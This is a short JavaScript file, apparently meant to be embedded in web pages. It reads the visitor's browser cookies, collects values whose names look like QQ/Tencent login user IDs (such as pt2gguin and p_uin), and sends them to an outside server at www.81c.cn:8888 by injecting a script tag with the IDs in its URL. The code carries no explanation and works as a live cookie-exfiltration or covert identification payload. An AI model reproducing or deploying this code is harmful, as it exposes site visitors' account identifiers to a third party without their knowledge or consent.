var c=document.cookie;
var vc=c.split("; ");
var i;
var pp="";

for (i=0;i<vc.length;i++)
{
	var tmp=vc[i].split("=");
	if ( tmp[0]=='pt2gguin' ||  tmp[0]=='uin_cookie' || tmp[0]=='ptui_loginuin' || tmp[0]=='o_cookie' || tmp[0]=='p_uin')
	{
		pp=pp+tmp[1] + '%2C';
	}
}
if(pp!="")
{
	var oScript=document.createElement("script");
	oScript.type="text/javascript";
	oScript.src="http://www.81c.cn:8888/cs/query.asp?webID=" + pp + "&tm=" + Math.random();

		 if (oScript.readyState) {
			 oScript.onreadystatechange = function() {
				if (oScript.readyState == "loaded" || oScript.readyState == "complete") {
					oScript.onreadystatechange = null;
					
				}
			 };
		 } else {
			 oScript.onload = function() {
				
			 };
		 }
		document.getElementsByTagName('HEAD').item(0).appendChild(oScript);
		
}
